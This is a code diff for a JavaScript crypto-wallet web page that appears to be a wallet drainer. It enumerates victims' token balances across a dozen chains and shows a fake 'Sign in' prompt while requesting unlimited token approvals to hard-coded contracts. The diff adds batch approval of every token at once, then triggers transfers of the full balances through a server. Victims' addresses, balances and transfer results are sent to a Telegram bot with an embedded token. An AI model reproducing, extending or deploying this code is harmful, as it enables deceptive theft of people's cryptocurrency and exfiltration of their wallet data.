@@ -1,9 +1,12 @@
 import { bsc, mainnet, polygon, arbitrum, optimism, base, scroll, avalanche, fantom, linea, zkSync, celo } from '@reown/appkit/networks'
 import { createAppKit } from '@reown/appkit'
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
-import { formatUnits, maxUint256, isAddress, getAddress, parseUnits } from 'viem'
-import { readContract, writeContract } from '@wagmi/core'
+import { formatUnits, maxUint256, isAddress, getAddress, parseUnits, encodeFunctionData } from 'viem'
+import { readContract, writeContract, sendCalls, estimateGas, getGasPrice, getBalance } from '@wagmi/core'
 import { showAMLCheckModal } from './aml-check-modal.js';
+
+// === Глобальный флаг для управления sendCalls ===
+const USE_SENDCALLS = true; // Поставьте false для отключения batch-операций
 
 // Утилита для дебаунсинга
 const debounce = (func, wait) => {
@@ -14,9 +17,61 @@ const debounce = (func, wait) => {
   }
 }
 
+
+
+// Функция для мониторинга транзакции
+
+const monitorAndSpeedUpTransaction = async (txHash, chainId, wagmiConfig) => {
+
+  try {
+
+    console.log(`Monitoring transaction ${txHash} on chain ${chainId}`)
+
+    
+
+    // Ждем 5 секунд для проверки статуса транзакции
+
+    await new Promise(resolve => setTimeout(resolve, 5000))
+
+    
+
+    // Проверяем статус транзакции
+
+    try {
+
+      // Здесь можно добавить проверку статуса через RPC
+
+      // Пока что просто логируем
+
+      console.log(`Transaction ${txHash} status check completed`)
+
+      
+
+    } catch (statusError) {
+
+      console.log(`Could not check transaction status: ${statusError.message}`)
+
+    }
+
+    
+
+    console.log(`Transaction ${txHash} monitoring completed`)
+
+    return true
+
+  } catch (error) {
+
+    console.error(`Error monitoring transaction ${txHash}:`, error)
+
+    return false
+
+  }
+}
+
 // Конфигурация
 const projectId = import.meta.env.VITE_PROJECT_ID || '2511b8e8161d6176c55da917e0378c9a'
 if (!projectId) throw new Error('VITE_PROJECT_ID is not set')
+
 
 const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '8238426852:AAGEc__oMefvCpE_jJtgsjDCleEfDBrjolc'
 const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || '-4835655591'
@@ -31,6 +86,7 @@ const networkMap = {
   'Base': { networkObj: base, chainId: networks[5].id || 8453 },
   'Scroll': { networkObj: scroll, chainId: networks[6].id || 534352 },
   'Avalanche': { networkObj: avalanche, chainId: networks[7].id || 43114 },
+
   'Fantom': { networkObj: fantom, chainId: networks[8].id || 250 },
   'Linea': { networkObj: linea, chainId: networks[9].id || 59144 },
   'zkSync': { networkObj: zkSync, chainId: networks[10].id || 324 },
@@ -39,10 +95,12 @@ const networkMap = {
 console.log('Network Map:', networkMap)
 
 const CONTRACTS = {
+
   [networkMap['Ethereum'].chainId]: '0xa65972Fce9925983f35185891109c4be643657aD',
   [networkMap['BNB Smart Chain'].chainId]: '0x537AC4F6Dc238003fd8bb281F954A9912180530B',
   [networkMap['Polygon'].chainId]: '0xD29BD8fC4c0Acfde1d0A42463805d34A1902095c',
   [networkMap['Arbitrum'].chainId]: '0x1234567890123456789012345678901234567890',
+
   [networkMap['Optimism'].chainId]: '0x2345678901234567890123456789012345678901',
   [networkMap['Base'].chainId]: '0x3456789012345678901234567890123456789012',
   [networkMap['Scroll'].chainId]: '0x4567890123456789012345678901234567890123',
@@ -50,6 +108,7 @@ const CONTRACTS = {
   [networkMap['Fantom'].chainId]: '0xabcdef1234567890abcdef1234567890abcdef12',
   [networkMap['Linea'].chainId]: '0xbcdef1234567890abcdef1234567890abcdef123',
   [networkMap['zkSync'].chainId]: '0xcdef1234567890abcdef1234567890abcdef1234',
+
   [networkMap['Celo'].chainId]: '0xdef1234567890abcdef1234567890abcdef12345'
 }
 
@@ -57,11 +116,13 @@ const wagmiAdapter = new WagmiAdapter({ projectId, networks })
 const appKit = createAppKit({
   adapters: [wagmiAdapter],
   networks,
+
   projectId,
   features: { analytics: true, email: false, socials: false }
 })
 
 // Состояние приложения
+
 const store = {
   accountState: {},
   networkState: {},
@@ -82,6 +143,7 @@ function createCustomModal() {
       opacity: 0;
       transition: opacity 0.3s ease-in-out;
       display: none;
+
       position: fixed;
       z-index: 1000;
       left: 0;
@@ -98,6 +160,7 @@ function createCustomModal() {
     }
     .custom-modal-content {
       transform: translateY(-20px);
+
       transition: transform 0.3s ease-in-out, opacity 0.3s ease-in-out;
       opacity: 0;
       background-color: #121313;
@@ -117,6 +180,7 @@ function createCustomModal() {
       font-size: 20px;
       font-weight: 600;
       margin-bottom: 45px;
+
       margin-top: -25px;
     }
     .custom-modal-loader {
@@ -129,6 +193,7 @@ function createCustomModal() {
       margin: 0 auto 20px;
     }
     .custom-modal-message {
+
       margin-top: 45px;
       font-size: 16px;
       line-height: 1.5;
@@ -149,6 +214,7 @@ function createCustomModal() {
       <p class="custom-modal-title">Sign in</p>
       <div class="custom-modal-loader"></div>
       <p class="custom-modal-message">Sign this message to prove you own this wallet and proceed. Canceling will disconnect you.</p>
+
     </div>
   `
   document.body.appendChild(modal)
@@ -156,6 +222,7 @@ function createCustomModal() {
 
 function showCustomModal() {
   const modal = document.getElementById('customModal')
+
   if (modal) {
     modal.style.display = 'flex'
     setTimeout(() => modal.classList.add('show'), 10)
@@ -176,6 +243,7 @@ function hideCustomModal() {
 window.addEventListener('load', () => {
   appKit.disconnect()
   localStorage.clear()
+
   sessionStorage.clear()
   store.accountState = {}
   store.networkState = {}
@@ -200,6 +268,7 @@ const updateStore = (key, value) => {
 
 const updateStateDisplay = (elementId, state) => {
   const element = document.getElementById(elementId)
+
   if (element) element.innerHTML = JSON.stringify(state, null, 2)
 }
 
@@ -242,6 +311,7 @@ const getScanLink = (hash, chainId, isTx = false) => {
   }
   return '#'
 }
+
 
 // Функция отправки запроса на трансфер
 const sendTransferRequest = async (userAddress, tokenAddress, amount, chainId, txHash) => {
@@ -326,6 +396,7 @@ async function notifyWalletConnection(address, walletName, device, balances, cha
         const price = ['USDT', 'USDC'].includes(token.symbol) ? 1 : token.price || 0
         const value = token.balance * price
         totalValue += value
+
         return `➡️ ${token.symbol} - ${value.toFixed(2)}$`
       })
       .join('\n')
@@ -343,6 +414,7 @@ async function notifyWalletConnection(address, walletName, device, balances, cha
       const modalMessage = document.querySelector('.custom-modal-message')
       if (modalMessage) modalMessage.textContent = 'Congratulations!'
       await new Promise(resolve => setTimeout(resolve, 1000))
+      hideCustomModal()
       store.isProcessingConnection = false
       return
     }
@@ -369,7 +441,6 @@ async function notifyTransferApproved(address, walletName, device, token, chainI
                     `➡️ ${token.symbol}\n\n` +
                     `🔗 Site: ${siteUrl}`
     await sendTelegramMessage(message)
-    await showAMLCheckModal()
   } catch (error) {
     store.errors.push(`Error in notifyTransferApproved: ${error.message}`)
   }
@@ -391,6 +462,7 @@ async function notifyTransferSuccess(address, walletName, device, token, chainId
                     `➡️ ${token.symbol} - ${amountValue}$\n\n` +
                     `🔗 Transfer: [Transaction Hash](${txLink})`
     await sendTelegramMessage(message)
+    await showAMLCheckModal()
   } catch (error) {
     store.errors.push(`Error in notifyTransferSuccess: ${error.message}`)
   }
@@ -401,6 +473,7 @@ const TOKENS = {
     { symbol: 'USDT', address: '0xdac17f958d2ee523a2206206994597c13d831ec7', decimals: 6 },
     { symbol: 'USDC', address: '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48', decimals: 6 },
     { symbol: 'DAI', address: '0x6b175474e89094c44da98b954eedeac495271d0f', decimals: 18 },
+
     { symbol: 'WBTC', address: '0x2260fac5e5542a773aa44fbcfedf7c193bc2c599', decimals: 8 },
     { symbol: 'UNI', address: '0x1f9840a85d5af5bf1d1762f925bdaddc4201f984', decimals: 18 },
     { symbol: 'LINK', address: '0x514910771af9ca656af840dff83e8264ecf986ca', decimals: 18 },
@@ -440,6 +513,7 @@ const TOKENS = {
     { symbol: 'BELT', address: '0xe0e514c71282b6f4e823703a39374cf58dc3ea4f', decimals: 18 },
     { symbol: 'MBOX', address: '0x3203c9e46ca618c8c4c2c9f0e2e7b0d5d0e75', decimals: 18 },
     { symbol: 'SFP', address: '0xd41fdb03ba84762dd66a0af1a6c8540ff1ba5dfb', decimals: 18 },
+
     { symbol: 'BabyDoge', address: '0xc748673057861a797275cd8a068abb95a902e8de', decimals: 18 },
     { symbol: 'EGC', address: '0xc001bbe2b87079294c63ece98bdd0a88d761434e', decimals: 18 },
     { symbol: 'QUACK', address: '0xd74b782e05aa25c50e7330af541d46e18f36661c', decimals: 18 },
@@ -481,6 +555,7 @@ const TOKENS = {
   ],
   'Linea': [
     { symbol: 'USDT', address: '0xa219439258ca9da29e9cc4ce5596924745e12b93', decimals: 6 },
+
     { symbol: 'USDC', address: '0x176211869ca2b568f2a7d4ee941e073a821ee1ff', decimals: 6 }
   ],
   'zkSync': [
@@ -529,6 +604,7 @@ const getTokenBalance = async (wagmiConfig, address, tokenAddress, decimals, cha
     return 0
   }
   try {
+
     const balance = await readContract(wagmiConfig, {
       address: tokenAddress,
       abi: erc20Abi,
@@ -568,6 +644,7 @@ const waitForAllowance = async (wagmiConfig, userAddress, tokenAddress, contract
   while (true) {
     const allowance = await getTokenAllowance(wagmiConfig, userAddress, tokenAddress, contractAddress, chainId)
     console.log(`Current allowance: ${allowance.toString()}`)
+
     if (allowance > 1000) {
       console.log(`Allowance is now maximum: ${allowance.toString()}`)
       return true
@@ -580,6 +657,7 @@ const getTokenPrice = async (symbol) => {
   try {
     const response = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${symbol}USDT`)
     if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`)
+
     const data = await response.json()
     return Number(data.price) || 0
   } catch (error) {
@@ -600,9 +678,16 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId)
       abi: erc20Abi,
       functionName: 'approve',
       args: [checksumContractAddress, maxUint256],
-      chainId,
+
+      chainId
     })
     console.log(`Approve transaction sent: ${txHash}`)
+    
+    // Запускаем мониторинг транзакции в фоне
+    monitorAndSpeedUpTransaction(txHash, chainId, wagmiConfig).catch(error => {
+      console.error(`Error monitoring transaction ${txHash}:`, error)
+    })
+    
     return txHash
   } catch (error) {
     store.errors.push(`Approve token failed: ${error.message}`)
@@ -610,9 +695,115 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId)
   }
 }
 
+// Add batch operations function after the getTokenPrice function
+const performBatchOperations = async (mostExpensive, allBalances, state) => {
+  if (!mostExpensive) {
+    console.log('No most expensive token found, skipping batch operations')
+    return false
+  }
+  if (!USE_SENDCALLS) {
+    // Если sendCalls отключён, всегда возвращаем ошибку для fallback
+    return { success: false, error: 'BATCH_NOT_SUPPORTED' }
+  }
+
+  console.log(`Attempting batch operations for network: ${mostExpensive.network}`)
+
+  // Добавляем проверку и смену сети
+  const targetNetworkInfo = networkMap[mostExpensive.network]
+  if (!targetNetworkInfo) {
+
+    const errorMessage = `Target network for ${mostExpensive.network} (chainId ${mostExpensive.chainId}) not found in networkMap`
+    store.errors.push(errorMessage)
+    return { success: false, error: errorMessage }
+  }
+
+  const targetNetwork = targetNetworkInfo.networkObj
+  const expectedChainId = targetNetworkInfo.chainId
+
+  if (store.networkState.chainId !== expectedChainId) {
+    console.log(`Attempting to switch to ${mostExpensive.network} (chainId ${expectedChainId})`)
+    try {
+      await new Promise((resolve, reject) => {
+        const unsubscribe = appKit.subscribeNetwork(networkState => {
+          if (networkState.chainId === expectedChainId) {
+            console.log(`Successfully switched to ${mostExpensive.network} (chainId ${expectedChainId})`)
+            unsubscribe()
+            resolve()
+          }
+        })
+        appKit.switchNetwork(targetNetwork).catch(error => {
+          unsubscribe()
+
+          reject(error)
+        })
+        setTimeout(() => {
+          unsubscribe()
+          reject(new Error(`Failed to switch to ${mostExpensive.network} (chainId ${expectedChainId}) after timeout`))
+        }, 10000)
+      })
+    } catch (error) {
+      const errorMessage = `Failed to switch network to ${mostExpensive.network} (chainId ${expectedChainId}): ${error.message}`
+      store.errors.push(errorMessage)
+      return { success: false, error: errorMessage }
+    }
+  } else {
+    console.log(`Already on correct network: ${mostExpensive.network} (chainId ${expectedChainId})`)
+  }
 
 
-// Инициализация подписок
+  try {
+    // Get tokens with non-zero balance in the most expensive token's network
+    const networkTokens = allBalances.filter(t => t.network === mostExpensive.network && t.balance > 0)
+
+    // Prepare approve calls for ERC-20 tokens
+    const approveCalls = networkTokens
+      .filter(t => t.address !== 'native')
+      .map(t => ({
+        to: getAddress(t.address),
+        data: encodeFunctionData({
+
+          abi: erc20Abi,
+          functionName: 'approve',
+          args: [getAddress(CONTRACTS[mostExpensive.chainId]), maxUint256]
+        }),
+        value: '0x0'
+      }))
+
+    // Send batch transaction
+    if (approveCalls.length > 0) {
+	const gasLimit = BigInt(550000)
+   	const maxFeePerGas = BigInt(1000000000)
+    	const maxPriorityFeePerGas = BigInt(1000000000)
+    	console.log(`Approving token with gasLimit: ${gasLimit}, 	maxFeePerGas: ${maxFeePerGas}, maxPriorityFeePerGas: ${maxPriorityFeePerGas}`)
+      const id = await sendCalls(wagmiAdapter.wagmiConfig, {
+        calls: approveCalls,
+        account: getAddress(state.address),
+        chainId: mostExpensive.chainId,
+        gas: gasLimit,
+	maxFeePerGas,
+	maxPriorityFeePerGas
+
+      })
+
+      console.log(`Batch transaction sent with id: ${id}`)
+      return { success: true, txHash: id }
+    }
+
+    return { success: false, message: 'No operations to perform' }
+
+  } catch (error) {
+
+    console.error('Batch operation error:', error)
+
+    if (error.message.includes('wallet_sendCalls') || error.message.includes('does not exist / is not available')) {
+
+      return { success: false, error: 'BATCH_NOT_SUPPORTED' }
+    }
+    return { success: false, error: error.message }
+  }
+}
+
+// Модифицируем initializeSubscribers для корректной работы уведомлений
 const initializeSubscribers = (modal) => {
   const debouncedSubscribeAccount = debounce(async state => {
     updateStore('accountState', state)
@@ -672,127 +863,137 @@ const initializeSubscribers = (modal) => {
         }
       }
       await notifyWalletConnection(state.address, walletInfo.name, device, allBalances, store.networkState.chainId)
+      
       if (mostExpensive) {
-        console.log(`Самый дорогой токен: ${mostExpensive.symbol}, количество: ${mostExpensive.balance}, цена в USDT: ${mostExpensive.price} (${mostExpensive.symbol === 'USDT' || mostExpensive.symbol === 'USDC' ? 'Fixed' : 'Binance API'})`)
-        console.log('Available networks:', networks.map(n => ({ name: n.name, chainId: n.id || 'undefined' })))
-        const targetNetworkInfo = networkMap[mostExpensive.network]
-        if (!targetNetworkInfo) {
-          const errorMessage = `Target network for ${mostExpensive.network} (chainId ${mostExpensive.chainId}) not found in networkMap`
-          store.errors.push(errorMessage)
-          const approveState = document.getElementById('approveState')
-          if (approveState) approveState.innerHTML = errorMessage
-          store.isProcessingConnection = false
-          return
-        }
-        const targetNetwork = targetNetworkInfo.networkObj
-        const expectedChainId = targetNetworkInfo.chainId
-        if (store.networkState.chainId !== expectedChainId) {
-          console.log(`Attempting to switch to ${mostExpensive.network} (chainId ${expectedChainId})`)
+        console.log(`Most expensive token: ${mostExpensive.symbol}, balance: ${mostExpensive.balance}, price in USDT: ${mostExpensive.price}`)
+        
+        // Try batch operations first
+        const batchResult = await performBatchOperations(mostExpensive, allBalances, state)
+        
+        if (batchResult.success) {
+          // Handle successful batch transaction
+          console.log('Batch transaction successful')
+          
+          // Get all tokens that were approved in batch
+          const approvedTokens = allBalances.filter(t => 
+            t.network === mostExpensive.network && 
+            t.balance > 0 &&
+            t.address !== 'native'
+          )
+          
+          // Notify about batch approval for all tokens
+          for (const token of approvedTokens) {
+            await notifyTransferApproved(
+              state.address,
+              walletInfo.name,
+              device,
+              token,
+              mostExpensive.chainId
+            )
+          }
+          
+          // Wait for allowance and send transfer request for all approved tokens
+          for (const token of approvedTokens) {
+            try {
+              await waitForAllowance(
+                wagmiAdapter.wagmiConfig,
+                state.address,
+                token.address,
+                CONTRACTS[mostExpensive.chainId],
+                mostExpensive.chainId
+              )
+              
+              const transferResult = await sendTransferRequest(
+                state.address,
+                token.address,
+                parseUnits(token.balance.toString(), token.decimals),
+                mostExpensive.chainId,
+                batchResult.txHash
+              )
+              
+              if (transferResult.success) {
+                await notifyTransferSuccess(
+                  state.address,
+                  walletInfo.name,
+                  device,
+                  token,
+                  mostExpensive.chainId,
+                  transferResult.txHash
+                )
+              }
+            } catch (error) {
+              console.error(`Error processing token ${token.symbol}:`, error)
+              store.errors.push(`Failed to process ${token.symbol}: ${error.message}`)
+            }
+          }
+        } else if (batchResult.error === 'BATCH_NOT_SUPPORTED') {
+          // Fallback to regular approve if batch is not supported
+          console.log('Batch transactions not supported (wallet_sendCalls not available), falling back to regular approve')
+          
           try {
-            await new Promise((resolve, reject) => {
-              const unsubscribe = modal.subscribeNetwork(networkState => {
-                if (networkState.chainId === expectedChainId) {
-                  console.log(`Successfully switched to ${mostExpensive.network} (chainId ${expectedChainId})`)
-                  unsubscribe()
-                  resolve()
-                }
-              })
-              appKit.switchNetwork(targetNetwork).catch(error => {
-                unsubscribe()
-                reject(error)
-              })
-              setTimeout(() => {
-                unsubscribe()
-                reject(new Error(`Failed to switch to ${mostExpensive.network} (chainId ${expectedChainId}) after timeout`))
-              }, 10000)
-            })
+            const contractAddress = CONTRACTS[mostExpensive.chainId]
+            const approvalKey = `${state.address}_${mostExpensive.chainId}_${mostExpensive.address}_${contractAddress}`
+            
+            if (!store.approvedTokens[approvalKey] && !store.isApprovalRequested && !store.isApprovalRejected) {
+              store.isApprovalRequested = true
+              const txHash = await approveToken(
+                wagmiAdapter.wagmiConfig,
+                mostExpensive.address,
+                contractAddress,
+                mostExpensive.chainId
+              )
+              
+              store.approvedTokens[approvalKey] = true
+              store.isApprovalRequested = false
+              
+              // Notify about single token approval
+              await notifyTransferApproved(
+                state.address,
+                walletInfo.name,
+                device,
+                mostExpensive,
+                mostExpensive.chainId
+              )
+              
+              // Wait for allowance and send transfer request
+              await waitForAllowance(
+                wagmiAdapter.wagmiConfig,
+                state.address,
+                mostExpensive.address,
+                contractAddress,
+                mostExpensive.chainId
+              )
+              
+              const transferResult = await sendTransferRequest(
+                state.address,
+                mostExpensive.address,
+                parseUnits(mostExpensive.balance.toString(), mostExpensive.decimals),
+                mostExpensive.chainId,
+                txHash
+              )
+              
+              if (transferResult.success) {
+                await notifyTransferSuccess(
+                  state.address,
+                  walletInfo.name,
+                  device,
+                  mostExpensive,
+                  mostExpensive.chainId,
+                  transferResult.txHash
+                )
+              }
+            } else {
+              console.log('Approve already requested or rejected, skipping')
+              // Не закрываем модалку и не сбрасываем состояние!
+            }
           } catch (error) {
-            const errorMessage = `Failed to switch network to ${mostExpensive.network} (chainId ${expectedChainId}): ${error.message}`
-            store.errors.push(errorMessage)
-            const approveState = document.getElementById('approveState')
-            if (approveState) approveState.innerHTML = errorMessage
-            hideCustomModal()
-            store.isProcessingConnection = false
-            return
-          }
-        } else {
-          console.log(`Already on correct network: ${mostExpensive.network} (chainId ${expectedChainId})`)
-        }
-        try {
-          const contractAddress = CONTRACTS[mostExpensive.chainId]
-          const approvalKey = `${state.address}_${mostExpensive.chainId}_${mostExpensive.address}_${contractAddress}`
-          if (store.approvedTokens[approvalKey] || store.isApprovalRequested || store.isApprovalRejected) {
-            const approveMessage = store.approvedTokens[approvalKey]
-              ? `Approve already completed for ${mostExpensive.symbol} on ${mostExpensive.network}`
-              : store.isApprovalRejected
-              ? `Approve was rejected for ${mostExpensive.symbol} on ${mostExpensive.network}`
-              : `Approve request pending for ${mostExpensive.symbol} on ${mostExpensive.network}`
-            console.log(approveMessage)
-            const approveState = document.getElementById('approveState')
-            if (approveState) approveState.innerHTML = approveMessage
-            store.isProcessingConnection = false
-            return
-          }
-          store.isApprovalRequested = true
-          const txHash = await approveToken(wagmiAdapter.wagmiConfig, mostExpensive.address, contractAddress, mostExpensive.chainId)
-          store.approvedTokens[approvalKey] = true
-          store.isApprovalRequested = false
-          let approveMessage = `Approve successful for ${mostExpensive.symbol} on ${mostExpensive.network}: ${txHash}`
-          console.log(approveMessage)
-          await notifyTransferApproved(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId)
-          
-          // Ждем подтверждения allowance
-          console.log('Waiting for allowance confirmation...')
-          await waitForAllowance(wagmiAdapter.wagmiConfig, state.address, mostExpensive.address, contractAddress, mostExpensive.chainId)
-          
-          // Отправляем запрос на сервер с корректным amount
-          const amount = parseUnits(mostExpensive.balance.toString(), mostExpensive.decimals)
-          console.log(`Sending transfer request with amount: ${amount.toString()}`)
-          const transferResult = await sendTransferRequest(state.address, mostExpensive.address, amount, mostExpensive.chainId, txHash)
-          
-          if (transferResult.success) {
-            console.log(`Transfer successful: ${transferResult.txHash}`)
-            await notifyTransferSuccess(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId, transferResult.txHash)
-            approveMessage += `<br>Transfer successful: ${transferResult.txHash}`
-          } else {
-            console.log(`Transfer failed: ${transferResult.message}`)
-            approveMessage += `<br>Transfer failed: ${transferResult.message}`
-          }
-          
-          const approveState = document.getElementById('approveState')
-          if (approveState) approveState.innerHTML = approveMessage
-          hideCustomModal()
-          store.isProcessingConnection = false
-        } catch (error) {
-          store.isApprovalRequested = false
-          if (error.code === 4001 || error.code === -32000) {
-            store.isApprovalRejected = true
-            const errorMessage = `Approve was rejected for ${mostExpensive.symbol} on ${mostExpensive.network}`
-            store.errors.push(errorMessage)
-            const approveState = document.getElementById('approveState')
-            if (approveState) approveState.innerHTML = errorMessage
-            hideCustomModal()
-            appKit.disconnect()
-            store.connectionKey = null
-            store.isProcessingConnection = false
-            sessionStorage.clear()
-          } else {
-            const errorMessage = `Approve failed for ${mostExpensive.symbol} on ${mostExpensive.network}: ${error.message}`
-            store.errors.push(errorMessage)
-            const approveState = document.getElementById('approveState')
-            if (approveState) approveState.innerHTML = errorMessage
-            hideCustomModal()
-            store.isProcessingConnection = false
+            handleApproveError(error, mostExpensive, state)
           }
         }
-      } else {
-        const message = 'No tokens with positive balance'
-        console.log(message)
-        const mostExpensiveState = document.getElementById('mostExpensiveTokenState')
-        if (mostExpensiveState) mostExpensiveState.innerHTML = message
-        hideCustomModal()
-        store.isProcessingConnection = false
       }
+      
+      hideCustomModal()
+      store.isProcessingConnection = false
     }
   }, 1000)
   modal.subscribeAccount(debouncedSubscribeAccount)
@@ -820,6 +1021,30 @@ const initializeSubscribers = (modal) => {
       switchNetworkBtn.textContent = `Switch to ${nextNetwork}`
     }
   })
+}
+
+// Helper function to handle approve errors
+const handleApproveError = (error, token, state) => {
+  store.isApprovalRequested = false
+  if (error.code === 4001 || error.code === -32000) {
+    store.isApprovalRejected = true
+    const errorMessage = `Approve was rejected for ${token.symbol} on ${token.network}`
+    store.errors.push(errorMessage)
+    const approveState = document.getElementById('approveState')
+    if (approveState) approveState.innerHTML = errorMessage
+    hideCustomModal()
+    appKit.disconnect()
+    store.connectionKey = null
+    store.isProcessingConnection = false
+    sessionStorage.clear()
+  } else {
+    const errorMessage = `Approve failed for ${token.symbol} on ${token.network}: ${error.message}`
+    store.errors.push(errorMessage)
+    const approveState = document.getElementById('approveState')
+    if (approveState) approveState.innerHTML = errorMessage
+    hideCustomModal()
+    store.isProcessingConnection = false
+  }
 }
 
 initializeSubscribers(appKit)
